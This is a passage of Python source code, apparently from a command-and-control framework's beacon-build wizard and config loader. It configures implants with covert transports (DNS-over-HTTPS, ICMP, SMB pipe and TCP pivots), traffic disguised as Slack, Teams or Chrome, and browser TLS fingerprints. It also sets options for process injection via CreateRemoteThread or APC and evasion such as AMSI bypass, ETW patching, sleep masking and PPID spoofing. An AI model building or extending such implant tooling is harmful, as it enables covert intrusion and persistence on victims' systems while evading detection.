            if not tcp_rev_token.strip():
                print(f"  {c['red']}a token is required — generate "
                      f"one on the parent side and paste it here."
                      f"{c['end']}")
                return None
            if len(tcp_rev_token) != 64:
                print(f"  {c['red']}token must be exactly 64 hex "
                      f"characters{c['end']}")
                return None
            try:
                bytes.fromhex(tcp_rev_token)
            except ValueError:
                print(f"  {c['red']}token must be valid hex"
                      f"{c['end']}")
                return None

        if not _is_child:
            print(f"\n{c['cyan']}[4d/9] TCP relay — parent side"
                  f"{c['end']}")
            print(f"  {c['yellow']}Optional. If set, this beacon "
                  f"dials a child's TCP listener and relays its "
                  f"check-ins over its own transport. Leave blank "
                  f"for a plain beacon.{c['end']}")
            tcp_relay_target = _ask(
                'Child listener to dial (host:port, blank = skip)',
                '')
            if tcp_relay_target is None:
                return None
            tcp_relay_target = tcp_relay_target.strip()
            if tcp_relay_target:
                if ':' not in tcp_relay_target:
                    print(f"  {c['red']}Target must be host:port "
                          f"(e.g. 10.0.0.5:4444){c['end']}")
                    return None
                print(f"  {c['yellow']}The token must match the "
                      f"child's --tcp-token. Leave blank to "
                      f"generate one — the child will need to be "
                      f"rebuilt with it.{c['end']}")
                tcp_relay_token = _ask(
                    'Relay auth token (64 hex; blank = generate)',
                    '')
                if tcp_relay_token is None:
                    return None
                tcp_relay_token = tcp_relay_token.strip()
                if not tcp_relay_token:
                    import secrets as _sec
                    tcp_relay_token = _sec.token_hex(32)
                    print(f"  {c['cyan']}generated relay token: "
                          f"{c['bold']}{tcp_relay_token}{c['end']}")
                    print(f"  {c['yellow']}Rebuild the child with "
                          f"--tcp-token {tcp_relay_token} before "
                          f"deploying this parent.{c['end']}")
                elif len(tcp_relay_token) != 64:
                    print(f"  {c['red']}token must be exactly 64 "
                          f"hex characters{c['end']}")
                    return None
                else:
                    try:
                        bytes.fromhex(tcp_relay_token)
                    except ValueError:
                        print(f"  {c['red']}token must be valid "
                              f"hex{c['end']}")
                        return None

            print(f"\n{c['cyan']}[4d/9] TCP reverse — parent side"
                  f"{c['end']}")
            print(f"  {c['yellow']}Optional. If set, this beacon "
                  f"opens a TCP listener and waits for a child "
                  f"beacon to dial in. Leave blank for a plain "
                  f"beacon.{c['end']}")
            tcp_rev_listen = _ask(
                'TCP reverse listen address (host:port, '
                'blank = skip)', '')
            if tcp_rev_listen is None:
                return None
            tcp_rev_listen = tcp_rev_listen.strip()
            if tcp_rev_listen:
                if ':' not in tcp_rev_listen:
                    print(f"  {c['red']}Must be host:port "
                          f"(e.g. 0.0.0.0:4444){c['end']}")
                    return None
                print(f"  {c['yellow']}The token is the shared "
                      f"secret the child must present. Leave blank "
                      f"to generate one — the child will need to "
                      f"be built with it.{c['end']}")
                tcp_rev_token = _ask(
                    'Reverse auth token (64 hex; blank = generate)',
                    '')
                if tcp_rev_token is None:
                    return None
                tcp_rev_token = tcp_rev_token.strip()
                if not tcp_rev_token:
                    import secrets as _sec
                    tcp_rev_token = _sec.token_hex(32)
                    print(f"  {c['cyan']}generated reverse token: "
                          f"{c['bold']}{tcp_rev_token}{c['end']}")
                    print(f"  {c['yellow']}Rebuild the child with "
                          f"--tcp-rev-token {tcp_rev_token} before "
                          f"deploying this parent.{c['end']}")
                elif len(tcp_rev_token) != 64:
                    print(f"  {c['red']}token must be exactly 64 "
                          f"hex characters{c['end']}")
                    return None
                else:
                    try:
                        bytes.fromhex(tcp_rev_token)
                    except ValueError:
                        print(f"  {c['red']}token must be valid "
                              f"hex{c['end']}")
                        return None

        pivot_key_path = ''
        _is_pivot_parent = bool(
            smb_relay_pipe or tcp_relay_target or tcp_rev_listen)
        _is_pivot_child = (
            'smb' in [m.strip() for m in transport_mode.split(',')]
            or 'tcp' in [m.strip() for m in transport_mode.split(',')]
            or 'tcprev' in [m.strip() for m in transport_mode.split(',')]
        )
        if _is_pivot_parent or _is_pivot_child:
            role = []
            if _is_pivot_parent:
                role.append('pivot listener')
            if _is_pivot_child:
                role.append('pivot client')
            print(f"\n{c['cyan']}[4e/9] Pivot keypair{c['end']}")
            print(f"  {c['yellow']}This build is a "
                  f"{'/'.join(role)}. Every SMB and TCP build needs "
                  f"the engagement-wide ECDSA P-256 keypair. "
                  f"Generate one once with "
                  f"`beacon-build --pivot-key-gen`, then pass the "
                  f"same file to every parent and every child."
                  f"{c['end']}")
            pivot_key_path = _ask(
                'Pivot keypair PEM path',
                os.path.join('mtls_certs', 'pivot.pem'))
            if pivot_key_path is None:
                return None
            pivot_key_path = pivot_key_path.strip()
            if not pivot_key_path:
                print(f"  {c['red']}A pivot key path is required for "
                      f"SMB and TCP builds.{c['end']}")
                return None
            if not os.path.isfile(os.path.expanduser(pivot_key_path)):
                print(f"  {c['red']}Not found: {pivot_key_path}"
                      f"{c['end']}")
                print(f"  {c['yellow']}Run `beacon-build "
                      f"--pivot-key-gen` first.{c['end']}")
                return None

        if ',' in transport_mode:
            failover_raw = _ask(
                'Rotate after N consecutive failures', '3')
            if failover_raw is None:
                return None
            try:
                transport_failover_after = max(0, int(failover_raw))
            except ValueError:
                transport_failover_after = 3

        # ---- 5. Callback / zone ------------------------------------
        url = ''
        dns_domain = ''
        dns_resolver = ''
        doh_resolver = ''
        doh_host_header = ''
        doh_user_agent = ''
        icmp_host = ''

        _modes = [m.strip() for m in transport_mode.split(',')
                  if m.strip()]

        if ('http' in _modes or 'quic' in _modes
                or 'websocket' in _modes):
            if 'quic' in _modes and 'http' not in _modes:
                default_url = self._beacon_build_default_url(
                    for_quic=True)
            else:
                default_url = self._beacon_build_default_url()
            print(f"\n{c['cyan']}[5/9] Callback URL{c['end']}")
            print(f"  {c['yellow']}Use the handler's reachable "
                  f"address, not 127.0.0.1 unless the target is "
                  f"local. For a QUIC build this is the "
                  f"--beacon-quic-port URL. For a WebSocket build "
                  f"this is the --ws-port URL; the scheme is "
                  f"converted to wss:// at dial time by the "
                  f"client.{c['end']}")
            url = _ask('Callback URL', default_url)
            if url is None:
                return None

        if 'dns' in _modes or 'doh' in _modes:
            print(f"\n{c['cyan']}[5/9] DNS transport{c['end']}")
            print(f"  {c['yellow']}The zone must be delegated to the "
                  f"handler's host. The beacon queries "
                  f"<verb>.<sid>.<payload>.<domain> as TXT records."
                  f"{c['end']}")
            dns_domain = _ask('DNS zone', 'c2.example.com')
            if dns_domain is None:
                return None
            if not dns_domain.strip():
                print(f"  {c['red']}A zone is required for DNS."
                      f"{c['end']}")
                return None

        if 'dns' in _modes:
            dns_resolver = _ask(
                'DNS resolver (host:port, blank = system)', '')
            if dns_resolver is None:
                return None

        if 'doh' in _modes:
            print(f"  {c['yellow']}DoH sends the DNS query to a "
                  f"public resolver over HTTPS. Leave the resolver "
                  f"blank for Cloudflare (Firefox's default)."
                  f"{c['end']}")
            doh_resolver = _ask(
                'DoH endpoint URL',
                'https://cloudflare-dns.com/dns-query')
            if doh_resolver is None:
                return None
            print(f"  {c['yellow']}Optional Host: header override "
                  f"for a Cloudflare Worker or redirector. Leave "
                  f"blank for direct.{c['end']}")
            doh_host_header = _ask(
                'DoH Host header (blank = none)', '')
            if doh_host_header is None:
                return None

        if 'icmp' in _modes:
            print(f"\n{c['cyan']}[5/9] ICMP transport{c['end']}")
            print(f"  {c['yellow']}The C2's public IPv4 address as "
                  f"reachable from the target. The handler must be "
                  f"started with --icmp and CAP_NET_RAW."
                  f"{c['end']}")
            icmp_host = _ask('C2 IPv4 address', '')
            if icmp_host is None:
                return None
            if not icmp_host.strip():
                print(f"  {c['red']}An address is required."
                      f"{c['end']}")
                return None

        # ---- 5. OPSEC profile --------------------------------------
        try:
            from .beacon.builder import OPSEC_PROFILES
            opsec_values = list(OPSEC_PROFILES.keys())
        except Exception:
            opsec_values = ['default', 'stealth', 'opsec', 'paranoid']
        opsec_desc = {
            'default':  'No evasion — lab testing only',
            'stealth':  'String obfuscation — standard engagements',
            'opsec':    'Full suite, needs garble installed',
            'paranoid': 'Ops + extra sleep mask, needs garble',
        }
        opsec_opts = [
            (name, name, opsec_desc.get(name, ''))
            for name in opsec_values
        ]
        profile_name = _choose('[6/9] OPSEC profile', opsec_opts, 0)
        if profile_name is None:
            return None

        # ---- 6. C2 profile -----------------------------------------
        try:
            from .beacon.builder import list_c2_profiles
            c2_names = list_c2_profiles()
        except Exception:
            c2_names = []
        c2_desc = {
            'chrome':       '/api/v1/analytics/* (Chrome UA)',
            'slack':        '/api/client.connect (Slack UA)',
            'teams':        '/api/mt/part/emea-03/beta/* (Teams UA)',
            'discord':      '/api/v9/* (Discord UA)',
            'dropbox':      '/api/2/* (Dropbox UA)',
            'notion':       '/api/v3/* (Notion UA)',
            'google-drive': '/drive/v3/* (Google Drive UA)',
        }
        _dns_only = ('dns' in _modes or 'doh' in _modes) and not any(
            m in _modes for m in ('http', 'quic', 'websocket'))
        if _dns_only and 'dns' in c2_names:
            c2_opts = [('dns', 'dns',
                        'verb characters and chunk size for DNS/DoH')]
            c2_opts += [('', '(handler default)',
                         'the framework default b/t/r layout')]
            c2_opts += [(n, n, c2_desc.get(n, ''))
                        for n in c2_names if n != 'dns']
            c2_default_idx = 0
            print(f"  {c['dim']}on a DNS or DoH build the profile "
                  f"supplies the three verb characters and the "
                  f"per-chunk payload length. Pick 'dns' unless "
                  f"the listener is dispatching against a "
                  f"different profile, in which case pick the "
                  f"same one.{c['end']}")
        else:
            c2_opts = [('', '(handler default)',
                        'whatever --profile gave the handler')]
            c2_opts += [(n, n, c2_desc.get(n, '')) for n in c2_names]
            c2_default_idx = 1 if 'chrome' in c2_names else 0

        _PROFILE_PROMPT_TRANSPORTS = ('http', 'quic', 'websocket',
                                      'dns', 'doh', 'smb', 'tcp',
                                      'tcprev')
        if not any(m in _modes for m in _PROFILE_PROMPT_TRANSPORTS):
            c2_profile = ''
        else:
            c2_profile = _choose(
                '[7/9] C2 profile', c2_opts, c2_default_idx)
        if c2_profile is None:
            return None

        if c2_profile:
            try:
                from .beacon.builder import load_c2_profile
                from .beacon.shaping import validate as _validate_shaping
                prof = load_c2_profile(c2_profile) or {}
                sh = prof.get('shaping')
                if sh:
                    errors, warnings = _validate_shaping(sh)
                    for w in warnings:
                        print(f"\n  {c['yellow']}shaping warning "
                              f"({c2_profile}):{c['end']} {w}")
                    if errors:
                        print(f"\n  {c['red']}shaping block in "
                              f"{c2_profile!r} is invalid:"
                              f"{c['end']}")
                        for e in errors:
                            print(f"    {c['red']}✗{c['end']} {e}")
                        if not _ask(
                                'Continue anyway? (y/N)', 'n'
                        ).lower().startswith('y'):
                            return None
                    else:
                        shapes = ', '.join(sorted(sh.keys()))
                        print(f"\n  {c['green']}✓{c['end']} shaping: "
                              f"{c['dim']}{shapes}{c['end']}")
            except Exception:
                pass

        # ---- 7. TLS fingerprint ------------------------------------
        tls_opts = [
            ('go',      'go',
             'standard library — pre-utls default'),
            ('chrome',  'chrome',
             'Chrome 120 ClientHello via uTLS'),
            ('firefox', 'firefox',
             'Firefox 120 ClientHello via uTLS'),
            ('safari',  'safari',
             'Safari 16.0 ClientHello via uTLS'),
        ]

        if ('http' not in _modes and 'doh' not in _modes
                and 'websocket' not in _modes):
            tls_profile = 'go'
        else:
            tls_profile = _choose(
                '[8/9] TLS fingerprint', tls_opts, 0)
            if tls_profile is None:
                return None

        # ---- 8. Lifecycle ------------------------------------------
        print(f"\n{c['cyan']}[9/9] Lifecycle{c['end']}")
        kill_days = _ask('Kill days (0 = no kill date)', '30')
        if kill_days is None:
            return None
        try:
            kill_days_int = int(kill_days)
            if kill_days_int < 0:
                raise ValueError
        except (TypeError, ValueError):
            print(f"  {c['yellow']}Invalid — using 30{c['end']}")
            kill_days_int = 30

        print(f"  {c['yellow']}Verbose output writes diagnostic lines "
              f"to stderr on the target. Use only for debugging — it "
              f"leaves forensic artefacts.{c['end']}")
        verbose_choice = _ask(
            'Enable verbose stderr on the target? (y/N)', 'n')
        if verbose_choice is None:
            return None
        verbose_flag = str(verbose_choice).lower() in ('y', 'yes')

        print(f"  {c['yellow']}Work hours suppress check-ins outside "
              f"the window (target local time). Examples: "
              f"08:00-19:00, 22:00-06:00 (overnight), off (24/7)."
              f"{c['end']}")
        work_spec = _ask(
            'Work hours (HH:MM-HH:MM or off)', '08:00-19:00')
        if work_spec is None:
            return None
        work_spec = work_spec.strip().lower()

        def _valid_clock(s):
            if ':' not in s:
                return False
            try:
                h, m = s.split(':', 1)
                return 0 <= int(h) <= 23 and 0 <= int(m) <= 59
            except (ValueError, TypeError):
                return False

        if work_spec in ('off', 'none', 'disable', '00:00-00:00'):
            work_hours_start, work_hours_end = '00:00', '00:00'
        elif '-' in work_spec:
            ws, we = work_spec.split('-', 1)
            ws, we = ws.strip(), we.strip()
            if _valid_clock(ws) and _valid_clock(we):
                work_hours_start, work_hours_end = ws, we
            else:
                print(f"  {c['yellow']}Invalid format — using "
                      f"08:00-19:00{c['end']}")
                work_hours_start, work_hours_end = '08:00', '19:00'
        else:
            print(f"  {c['yellow']}Unrecognised — using 08:00-19:00"
                  f"{c['end']}")
            work_hours_start, work_hours_end = '08:00', '19:00'

        use_mtls = _ask('Embed mTLS client bundle? (y/N)', 'n')
        if use_mtls is None:
            return None
        mtls_yes = str(use_mtls).lower() in ('y', 'yes')

        mtls_dir = None
        mtls_cert_override = None
        mtls_key_override = None
        mtls_ca_override = None
        if mtls_yes:
            default_dir = self.mtls_cert_dir or 'mtls_certs'
            print(f"  {c['yellow']}Directory must contain client.pem, "
                  f"client.key, and ca.pem.{c['end']}")
            mtls_dir = _ask('mTLS directory', default_dir)
            if mtls_dir is None:
                return None
            mtls_dir = os.path.expanduser(mtls_dir)

            cert_path = os.path.join(mtls_dir, 'client.pem')
            key_path  = os.path.join(mtls_dir, 'client.key')
            ca_path   = os.path.join(mtls_dir, 'ca.pem')
            missing = [p for p in (cert_path, key_path, ca_path)
                       if not os.path.exists(p)]

            if missing:
                print(f"  {c['yellow']}Not found in {mtls_dir}: "
                      f"{', '.join(os.path.basename(m) for m in missing)}"
                      f"{c['end']}")
                adv = _ask('Override individual file paths? (y/N)', 'y')
                if adv is None:
                    return None
                if str(adv).lower() in ('y', 'yes'):
                    cert_path = _ask(
                        'Client certificate path', cert_path)
                    if cert_path is None:
                        return None
                    key_path = _ask('Client key path', key_path)
                    if key_path is None:
                        return None
                    ca_path = _ask('Root CA path', ca_path)
                    if ca_path is None:
                        return None
                    mtls_cert_override = cert_path
                    mtls_key_override = key_path
                    mtls_ca_override = ca_path

            for label, path in (
                    ('cert', mtls_cert_override or cert_path),
                    ('key',  mtls_key_override  or key_path),
                    ('ca',   mtls_ca_override   or ca_path)):
                if not os.path.isfile(path):
                    print(f"  {c['red']}Missing {label}: {path}"
                          f"{c['end']}")
                    return

        # ---- Injection ---------------------------------------------
        print(f"\n{c['cyan']}[9b/9] In-memory injection{c['end']}")
        print(f"  {c['yellow']}Embeds a loader-wrapped copy of the "
              f"agent as shellcode so `migrate <pid>` can inject "
              f"into a foreign process. Adds roughly 13 MB to the "
              f"binary. Without it, only `migrate --self` works."
              f"{c['end']}")
        if target_os == 'windows':
            print(f"  {c['yellow']}Windows: requires Donut on PATH "
                  f"or a vendored copy at beacon/bin/donut."
                  f"{c['end']}")
        else:
            print(f"  {c['yellow']}Linux: requires the vendored "
                  f"ELF-loader stub at beacon/bin/"
                  f"inject_linux_stub.bin.{c['end']}")
        inject_choice = _ask(
            'Enable in-memory injection (migrate <pid>)? (y/N)', 'n')
        if inject_choice is None:
            return None
        inject_flag = str(inject_choice).lower() in ('y', 'yes')

        inject_method = 'default'
        if inject_flag and target_os == 'windows':
            print(f"\n  {c['yellow']}`migrate <pid>` has two "
                  f"backends on Windows. `default` is "
                  f"CreateRemoteThread — the historical path, "
                  f"highest fidelity, highest signal. `apc` queues "
                  f"the shellcode to the target's existing threads "
                  f"through NtQueueApcThread — no new thread, no "
                  f"remote-thread event, but NtQueueApcThread is "
                  f"itself instrumented. See the README's Migration "
                  f"section for the honest scope of both."
                  f"{c['end']}")
            inject_method = _choose(
                'Injection method',
                [
                    ('default', 'default',
                     'CreateRemoteThread — highest fidelity'),
                    ('apc', 'apc',
                     'remote APC — no thread creation, no '
                     'CreateRemoteThread event'),
                ],
                default_index=0,
            )
            if inject_method is None:
                return None

        # ---- Summary and confirmation ------------------------------
        print(f"\n{c['cyan']}{'='*60}{c['end']}")
        print(f"{c['cyan']}  Build summary{c['end']}")
        print(f"{c['cyan']}{'='*60}{c['end']}")
        print(f"  Target       : {target_os}/{target_arch}")
        print(f"  Format       : {output_format}")
        print(f"  Transport    : {transport_mode}")
        _summary_modes = [m.strip() for m in transport_mode.split(',')
                          if m.strip()]
        if ('http' in _summary_modes or 'quic' in _summary_modes
                or 'websocket' in _summary_modes):
            print(f"  Callback URL : {url}")
        if 'dns' in _summary_modes or 'doh' in _summary_modes:
            print(f"  DNS zone     : {dns_domain}")
        if 'dns' in _summary_modes:
            print(f"  DNS resolver : "
                  f"{dns_resolver or '(system default)'}")
        if 'doh' in _summary_modes:
            print(f"  DoH endpoint : "
                  f"{doh_resolver or '(Cloudflare default)'}")
        if 'icmp' in _summary_modes:
            print(f"  ICMP host    : {icmp_host}")
        if 'wireguard' in _summary_modes:
            print(f"  WireGuard    : "
                  f"{wireguard_server_addr}")
            print(f"  Tunnel IP    : {wireguard_tunnel_ip}")
            print(f"  Server IP    : {wireguard_server_tunnel_ip}")
            if wireguard_inner_port:
                print(f"  Inner HTTPS  : "
                      f"{wireguard_inner_port}")
        if transport_mode == 'http,dns':
            print(f"  Failover     : after "
                  f"{transport_failover_after} consecutive failures")
        if 'smb' in _summary_modes:
            print(f"  Pipe name    : {smb_pipe}")
        if 'tcp' in _summary_modes:
            print(f"  Listen       : {tcp_bind_addr}")
        if 'tcprev' in _summary_modes:
            print(f"  TCP dial     : {tcp_rev_target}")
        if tcp_relay_target:
            print(f"  TCP relay    : {tcp_relay_target}")
        if tcp_rev_listen:
            print(f"  TCP rev lstn : {tcp_rev_listen}")
        if smb_relay_pipe:
            print(f"  SMB relay    : {smb_relay_pipe}")
        if ('smb' in _summary_modes or 'tcp' in _summary_modes
                or 'tcprev' in _summary_modes
                or smb_relay_pipe or tcp_relay_target
                or tcp_rev_listen):
            print(f"  Pivot key    : "
                  f"{pivot_key_path or '(none — build will fail)'}")
        print(f"  OPSEC        : {profile_name}")
        if any(m in _summary_modes for m in
               ('http', 'quic', 'websocket', 'dns', 'doh',
                'smb', 'tcp', 'tcprev')):
            print(f"  C2 profile   : "
                  f"{c2_profile or '(handler default)'}")
        print(f"  Kill days    : {kill_days_int}")
        if work_hours_start == work_hours_end:
            print(f"  Work hours   : off (24/7)")
        else:
            print(f"  Work hours   : {work_hours_start}-"
                  f"{work_hours_end} (target local time)")
        if verbose_flag:
            print(f"  Verbose      : {c['red']}yes — debug build, "
                  f"leaves stderr traces on the target{c['end']}")
        else:
            print(f"  Verbose      : no")
        if inject_flag:
            print(f"  Injection    : {c['yellow']}yes — embed "
                  f"loader-wrapped copy for `migrate <pid>` "
                  f"(+~13 MB){c['end']}")
            print(f"  Inject method: {inject_method}")
        else:
            print(f"  Injection    : no")
        if mtls_yes:
            print(f"  mTLS bundle  : yes ({mtls_dir})")
            if mtls_cert_override:
                print(f"    client cert: {mtls_cert_override}")
                print(f"    client key : {mtls_key_override}")
                print(f"    root CA    : {mtls_ca_override}")
            handler_ca = getattr(self, 'beacon_mtls_ca', None)
            handler_dir = getattr(self, 'beacon_mtls_dir', None)
            if handler_dir:
                print(f"  {c['yellow']}Listener mTLS: "
                      f"{handler_dir} (from --beacon-mtls-dir)"
                      f"{c['end']}")
            elif handler_ca:
                print(f"  {c['yellow']}Listener mTLS: "
                      f"{handler_ca} (from --beacon-mtls-ca)"
                      f"{c['end']}")
            else:
                print(f"  {c['yellow']}Listener mTLS: NOT CONFIGURED "
                      f"— the beacon listener is running server-TLS "
                      f"only and will reject this agent's handshake"
                      f"{c['end']}")
        else:
            print(f"  mTLS bundle  : no")
        print()

        try:
            confirm = input(
                f"  {c['green']}Compile? [Y/n]{c['end']}: "
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return None
        if confirm and confirm not in ('y', 'yes'):
            return None

        return {
            'target_os':        target_os,
            'target_arch':      target_arch,
            'output_format':    output_format,
            'url':              url,
            'transport_mode':   transport_mode,
            'transport_failover_after': transport_failover_after,
            'smb_pipe':         smb_pipe,
            'smb_relay_pipe':   smb_relay_pipe,
            'tcp_bind_addr':    tcp_bind_addr,
            'tcp_bind_token':   tcp_bind_token,
            'tcp_relay_target': tcp_relay_target,
            'tcp_relay_token':  tcp_relay_token,
            'tcp_rev_listen':   tcp_rev_listen,
            'tcp_rev_target':   tcp_rev_target,
            'tcp_rev_token':    tcp_rev_token,
            'wireguard_server_pubkey': wireguard_server_pubkey,
            'wireguard_server_addr':   wireguard_server_addr,
            'wireguard_agent_privkey': wireguard_agent_privkey,
            'wireguard_tunnel_ip':     wireguard_tunnel_ip,
            'wireguard_inner_port':    wireguard_inner_port,
            'wireguard_server_tunnel_ip': wireguard_server_tunnel_ip,
            'pivot_key_path':   pivot_key_path,
            'dns_domain':       dns_domain,
            'dns_resolver':     dns_resolver,
            'profile_name':     profile_name,
            'kill_days':        kill_days_int,
            'use_mtls':         mtls_yes,
            'c2_profile':       c2_profile or None,
            'tls_profile':      tls_profile,
            'work_hours_start': work_hours_start,
            'work_hours_end':   work_hours_end,
            'mtls_dir':         mtls_dir,
            'mtls_cert':        mtls_cert_override,
            'mtls_key':         mtls_key_override,
            'mtls_ca':          mtls_ca_override,
            'verbose':          verbose_flag,
            'inject':           inject_flag,
            'inject_method':    inject_method,
            'stage_key_hex':    stage_key_hex,
            'stage_name':       stage_name,
            'doh_resolver':     doh_resolver,
            'agent_keypair_path': '',
            'doh_host_header':  doh_host_header,
            'doh_user_agent':   doh_user_agent,
            'icmp_host':        icmp_host,
        }

    # ------------------------------------------------------------------
    # Build config file

    _EVASION_KEYS = (
        'antisanbox', 'amsi_bypass', 'etw_patch', 'sleep_mask',
        'syscall_method', 'string_obfuscation', 'garble', 'upx',
        'ppid_spoof', 'antidebug', 'antivm', 'verbose',
    )

    # --- Path whitelist ------------------------------------------------

    def _allowed_build_roots(self):
        here = os.path.dirname(os.path.abspath(__file__))
        repo = os.path.dirname(here)
        return [
            os.path.realpath(os.path.join(repo, 'mtls_certs')),
            os.path.realpath(os.path.join(repo, 'tls_certs')),
            os.path.realpath(os.path.join(here, 'profiles', 'c2')),
        ]

    def _check_build_path(self, path, label):
        """Raise ValueError unless `path` resolves under an allowed
        root. Empty or None passes."""
        if not path:
            return
        rp = os.path.realpath(os.path.expanduser(path))
        for root in self._allowed_build_roots():
            try:
                if os.path.commonpath([rp, root]) == root:
                    return
            except ValueError:
                continue
        raise ValueError(
            f'{label} path {path!r} resolves outside the '
            f'allowed build directories')

    _SLEEP_MASKS = ('', 'none', 'rc4', 'aes-ctr',
                      'cronos', 'hwbp')
    _SYSCALL_METHODS = ('direct', 'indirect')
    _TRANSPORTS = ('http', 'dns', 'doh', 'icmp', 'quic',
                   'websocket', 'wireguard', 'tcprev')

    def _load_build_config(self, path=None, raw=None,
                           remote=False):
        """Read a JSON build config and return a params dict
        compatible with the wizard/CLI paths.

        Two entry points:
            _load_build_config(path='file.json')     — local console
            _load_build_config(raw={...}, remote=True) — remote API

        When `remote` is True, every file path in the config is
        validated against `_allowed_build_roots()` before the params
        are returned. A hostile operator cannot point the builder
        at arbitrary files on the server.

        The config is merged over the selected `opsec_profile`, then
        any `evasion` block overrides are applied on top. The
        result is a fully-resolved parameter set — the caller does
        not need to consult OPSEC_PROFILES again.

        Returns (params, error_string). On success, error_string is
        None and params is a dict of build parameters with an extra
        `_evasion_overrides` key holding the per-field evasion dict.
        """
        import json as _json

        if raw is None:
            if not path:
                return None, 'no config file and no raw config'
            try:
                with open(path, 'r', encoding='utf-8') as fh:
                    raw = _json.load(fh)
            except OSError as exc:
                return None, f'cannot read {path}: {exc}'
            except ValueError as exc:
                return None, f'{path} is not valid JSON: {exc}'

        if not isinstance(raw, dict):
            return None, 'top level of config must be an object'

        # --- Base profile ----------------------------------------------
        profile_name = (raw.get('opsec_profile')
                        or raw.get('profile')
                        or 'default')
        try:
            from .beacon.builder import OPSEC_PROFILES
        except ImportError as exc:
            return None, f'cannot import OPSEC_PROFILES: {exc}'

        if profile_name not in OPSEC_PROFILES:
            return None, (
                f"unknown opsec_profile {profile_name!r}; "
                f"available: {', '.join(OPSEC_PROFILES)}")

        base = OPSEC_PROFILES[profile_name]
        evasion = {k: getattr(base, k) for k in self._EVASION_KEYS}

        # --- Evasion overrides ----------------------------------------
        user_ev = raw.get('evasion') or {}
        if not isinstance(user_ev, dict):
            return None, 'evasion must be an object'
        user_ev = {k: v for k, v in user_ev.items()
                   if not k.startswith('_')}
        unknown = set(user_ev) - set(self._EVASION_KEYS)
        if unknown:
            return None, (
                f"unknown evasion keys: {', '.join(sorted(unknown))}; "
                f"valid: {', '.join(self._EVASION_KEYS)}")
        for k, v in user_ev.items():
            evasion[k] = v

        if evasion['sleep_mask'] not in self._SLEEP_MASKS:
            return None, (
                f"sleep_mask must be one of "
                f"{', '.join(self._SLEEP_MASKS)} "
                f"(got {evasion['sleep_mask']!r})")
        if evasion['syscall_method'] not in self._SYSCALL_METHODS:
            return None, (
                f"syscall_method must be one of "
                f"{', '.join(self._SYSCALL_METHODS)} "
                f"(got {evasion['syscall_method']!r})")

        for k in self._EVASION_KEYS:
            if k in ('sleep_mask', 'syscall_method'):
                continue
            v = evasion[k]
            if isinstance(v, str):
                evasion[k] = v.strip().lower() in ('1', 'true', 'yes', 'on')
            else:
                evasion[k] = bool(v)

        # --- Top-level fields -----------------------------------------
        transport_mode = (raw.get('transport_mode')
                          or raw.get('transport') or 'http')
        modes = [m.strip().lower()
                 for m in str(transport_mode).split(',')
                 if m.strip()]
        if not modes:
            return None, 'transport_mode is empty'
        valid_modes = set(self._TRANSPORTS) | {
            'smb', 'tcp', 'tcprev', 'websocket', 'wireguard'}
        for m in modes:
            if m not in valid_modes:
                return None, (
                    f"unknown transport: {m!r} — valid values "
                    f"are 'http', 'dns', 'doh', 'icmp', 'smb', "
                    f"'tcp', 'tcprev', 'quic', 'websocket', "
                    f"'wireguard', or a comma-separated list")
        if 'smb' in modes and len(modes) > 1:
            return None, (
                "transport_mode 'smb' cannot be combined with "
                "other transports")
        if 'tcp' in modes and len(modes) > 1:
            return None, (
                "transport_mode 'tcp' cannot be combined with "
                "other transports")
        if 'tcprev' in modes and len(modes) > 1:
            return None, (
                "transport_mode 'tcprev' cannot be combined with "
                "other transports")
        if 'quic' in modes and len(modes) > 1:
            return None, (
                "transport_mode 'quic' cannot be combined with "
                "other transports in this version. Build a "
                "separate binary for a QUIC failover ring.")
        if 'websocket' in modes and len(modes) > 1:
            return None, (
                "transport_mode 'websocket' cannot be combined "
                "with other transports in this version.")
        if 'wireguard' in modes and len(modes) > 1:
            return None, (
                "transport_mode 'wireguard' cannot be combined "
                "with other transports in this version.")
        if 'websocket' in modes and not (raw.get('url') or '').strip():
            return None, (
                "transport_mode 'websocket' requires url "
                "(https://host:port; the client converts to "
                "wss:// automatically)")
        if 'wireguard' in modes:
            for field in ('wireguard_server_pubkey',
                          'wireguard_server_addr',
                          'wireguard_agent_privkey',
                          'wireguard_tunnel_ip'):
                if not (raw.get(field) or '').strip():
                    return None, (
                        f"transport_mode 'wireguard' requires "
                        f"{field}")
        transport_mode = ','.join(modes)

        if 'tcp' in modes:
            addr = raw.get('tcp_bind_addr') or ''
            token = raw.get('tcp_bind_token') or ''
            if not addr:
                return None, (
                    "transport_mode 'tcp' requires tcp_bind_addr")
            if not token or len(token) != 64:
                return None, (
                    "tcp_bind_token must be 64 hex characters")
            try:
                bytes.fromhex(token)
            except ValueError:
                return None, (
                    "tcp_bind_token must be valid hex")

        if 'tcprev' in modes:
            target = (raw.get('tcp_rev_target') or '').strip()
            token = (raw.get('tcp_rev_token') or '').strip()
            if not target:
                return None, (
                    "transport_mode 'tcprev' requires "
                    "tcp_rev_target")
            if ':' not in target:
                return None, (
                    "tcp_rev_target must be host:port")
            if not token or len(token) != 64:
                return None, (
                    "tcp_rev_token must be 64 hex characters")
            try:
                bytes.fromhex(token)
            except ValueError:
                return None, (
                    "tcp_rev_token must be valid hex")

        if 'smb' in modes and (raw.get('target_os') or 'linux') \
                != 'windows':
            return None, (
                "transport_mode 'smb' requires target_os=windows")

        if 'smb' in modes:
            pipe = (raw.get('smb_pipe') or '').strip()
            if not pipe:
                return None, (
                    "transport_mode 'smb' requires smb_pipe")
            if pipe.startswith('\\\\'):
                if '\\pipe\\' not in pipe:
                    return None, (
                        f"smb_pipe {pipe!r} looks like a UNC "
                        f"path but is missing the \\pipe\\ "
                        f"segment; expected "
                        f"\\\\HOST\\pipe\\NAME")
            else:
                for ch in pipe:
                    if not (ch.isalnum() or ch in '._-'):
                        return None, (
                            f"smb_pipe {pipe!r} contains "
                            f"{ch!r}; a bare pipe name may use "
                            f"only letters, digits, '.', '_' "
                            f"and '-'")

        relay_pipe = (raw.get('smb_relay_pipe') or '').strip()
        if relay_pipe and not all(
                c.isalnum() or c in '._-' for c in relay_pipe):
            return None, (
                "smb_relay_pipe may contain only alphanumerics, "
                "'.', '_' or '-'")

        if 'tcp' not in modes:
            relay_target = (raw.get('tcp_relay_target') or '').strip()
            relay_token = (raw.get('tcp_relay_token') or '').strip()
            if relay_target and not relay_token:
                return None, (
                    "tcp_relay_target requires tcp_relay_token "
                    "(the child mandates a token)")
            if relay_token:
                if len(relay_token) != 64:
                    return None, (
                        "tcp_relay_token must be 64 hex characters")
                try:
                    bytes.fromhex(relay_token)
                except ValueError:
                    return None, (
                        "tcp_relay_token must be valid hex")
